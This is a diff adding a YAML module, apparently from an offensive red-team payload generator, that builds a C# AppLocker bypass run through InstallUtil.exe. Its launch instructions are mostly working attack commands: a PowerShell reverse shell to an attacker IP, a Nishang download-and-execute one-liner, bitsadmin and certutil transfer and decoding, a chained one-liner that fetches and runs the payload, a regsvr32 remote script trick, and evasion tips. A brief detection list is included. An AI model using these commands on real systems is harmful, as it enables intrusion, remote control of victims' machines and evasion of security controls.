@@ -1,0 +1,195 @@
+meta:
+  name: "C# AppLocker Bypass via InstallUtil"
+  category: "Defense Evasion"
+  description: |
+    Bypass AppLocker application whitelisting using Microsoft-signed InstallUtil.exe.
+    
+    Features:
+    - Uses Microsoft-signed binary (InstallUtil.exe) to execute code
+    - PowerShell runspace for arbitrary code execution
+    - Downloads and executes remote PowerShell payload
+    - Bypasses AppLocker default rules
+    - Can be encoded with CertUtil for additional obfuscation
+    
+    This technique exploits the fact that AppLocker default rules allow
+    execution of binaries in C:\\Windows\\Microsoft.NET\\ directory.
+    InstallUtil.exe will execute code from [RunInstaller(true)] decorated classes.
+    
+    WARNING: For authorized security testing only!
+
+  effectiveness: "high"
+
+  mitre:
+    tactic: "TA0005 - Defense Evasion"
+    technique: "T1218.004 - Signed Binary Proxy Execution: InstallUtil"
+
+  artifacts:
+    - "InstallUtil.exe process execution"
+    - "PowerShell runspace creation"
+    - "Network connection to download payload"
+    - "WebClient DownloadString request"
+    - "PowerShell script execution in memory"
+
+parameters:
+  - name: "payload_host"
+    type: "string"
+    description: "HTTP server hosting PowerShell payload (run.txt)"
+    required: true
+    default: "192.168.1.10"
+
+  - name: "output_file"
+    type: "string"
+    description: "Output assembly filename"
+    required: false
+    default: "bypass.exe"
+
+  - name: "output_path"
+    type: "path"
+    description: "Output directory for generated payload"
+    required: false
+    default: "{config.output_dir}"
+
+preprocessing: []
+
+output:
+  type: "template"
+  template: "defense_evasion/applocker_bypass.cs"
+  compile:
+    enabled: true
+    command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 -r:System.Management.Automation.dll -r:System.Configuration.Install.dll {{ source_file }}"
+  launch_instructions: |
+    C# AppLocker Bypass via InstallUtil - Launch Instructions
+
+    Prerequisites:
+
+    - Target system with AppLocker enabled
+    - Network access from target to your HTTP server
+    - PowerShell payload (run.txt) hosted on web server
+    - .NET Framework on target (default on Windows)
+
+    Step 1: Create PowerShell Payload
+
+    Create run.txt with your PowerShell payload:
+
+    Example - Reverse Shell:
+    $client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',443);
+    $stream = $client.GetStream();
+    [byte[]]$bytes = 0..65535|%{0};
+    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+        $sendback = (iex $data 2>&1 | Out-String );
+        $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+        $stream.Write($sendbyte,0,$sendbyte.Length);
+        $stream.Flush()
+    };
+    $client.Close()
+
+    Or use Invoke-PowerShellTcp.ps1 from Nishang:
+    IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress YOUR_IP -Port 443
+
+    Step 2: Host Payload on Web Server
+
+    Start Python HTTP server:
+    python3 -m http.server 80
+
+    Place run.txt in the web root.
+
+    Verify accessibility:
+    curl http://{{ payload_host }}/run.txt
+
+    Step 3: Encode Binary (Optional but Recommended)
+
+    Encode the binary to evade file-based detection:
+
+    certutil -encode {{ output_file }} bypass_encoded.txt
+
+    Transfer bypass_encoded.txt to target.
+
+    On target, decode:
+    certutil -decode bypass_encoded.txt bypass.exe
+
+    Step 4: Transfer to Target
+
+    If not encoding, transfer directly:
+
+    Using Python HTTP server:
+    python3 -m http.server 8080
+
+    On target (PowerShell):
+    Invoke-WebRequest -Uri "http://YOUR_IP:8080/{{ output_file }}" -OutFile "C:\\Windows\\Tasks\\{{ output_file }}"
+
+    Or use SMB:
+    impacket-smbserver share . -smb2support
+    On target: copy \\YOUR_IP\share\{{ output_file }} C:\\Windows\\Tasks\\{{ output_file }}
+
+    Or use BitsAdmin (signed Microsoft binary):
+    bitsadmin /Transfer theJob http://YOUR_IP/bypass_encoded.txt C:\\Windows\\Tasks\\enc.txt
+    certutil -decode C:\\Windows\\Tasks\\enc.txt C:\\Windows\\Tasks\\bypass.exe
+
+    Step 5: Execute via InstallUtil
+
+    Run using InstallUtil.exe to bypass AppLocker:
+
+    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\Windows\\Tasks\\{{ output_file }}
+
+    Breakdown:
+    - /logfile= : Don't create log file
+    - /LogToConsole=false : Suppress console output
+    - /U : Uninstall mode (triggers Uninstall method)
+
+    Step 6: Verify Execution
+
+    Check your web server logs for payload download:
+    192.168.1.100 - - [01/Jan/2025] "GET /run.txt HTTP/1.1" 200
+
+    If reverse shell, check your listener for connection.
+
+    Notes:
+
+    - InstallUtil.exe is Microsoft-signed
+    - Allowed by default AppLocker rules
+    - PowerShell runspace executes in-memory
+    - No PowerShell.exe process spawned
+    - Downloads payload via WebClient
+    - Executes with user's current privileges
+
+    Complete One-Liner:
+
+    cmd.exe /c del C:\\Windows\\Tasks\\enc.txt && del C:\\Windows\\Tasks\\bypass.exe && bitsadmin /Transfer theJob http://{{ payload_host }}/bypass_encoded.txt C:\\Windows\\Tasks\\enc.txt && certutil -decode C:\\Windows\\Tasks\\enc.txt C:\\Windows\\Tasks\\bypass.exe && C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\Windows\\Tasks\\bypass.exe
+
+    Alternative Execution:
+
+    Using MSBuild.exe (another AppLocker bypass):
+    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe bypass.csproj
+
+    Using RegSvr32.exe (SCT file):
+    regsvr32 /s /n /u /i:http://{{ payload_host }}/file.sct scrobj.dll
+
+    Troubleshooting:
+
+    - AppLocker still blocks: Verify InstallUtil path is whitelisted
+    - No payload download: Check network connectivity and firewall
+    - Assembly not found: Ensure .NET 4.0+ is installed
+    - Error loading automation: System.Management.Automation.dll missing
+
+    Detection:
+
+    This technique can be detected via:
+    - Sysmon Event ID 1 (InstallUtil.exe execution)
+    - Network connection from InstallUtil.exe
+    - PowerShell Script Block Logging (if enabled)
+    - Event ID 4688 (Process creation - InstallUtil)
+
+    Evasion Tips:
+
+    - Use CertUtil encoding to obfuscate binary
+    - Randomize variable names in PowerShell payload
+    - Obfuscate PowerShell with Invoke-Obfuscation
+    - Chain multiple LOLBins (BitsAdmin -> CertUtil -> InstallUtil)
+
+    Cleanup:
+
+    Remove files from target:
+    del C:\\Windows\\Tasks\\bypass.exe
+    del C:\\Windows\\Tasks\\enc.txt
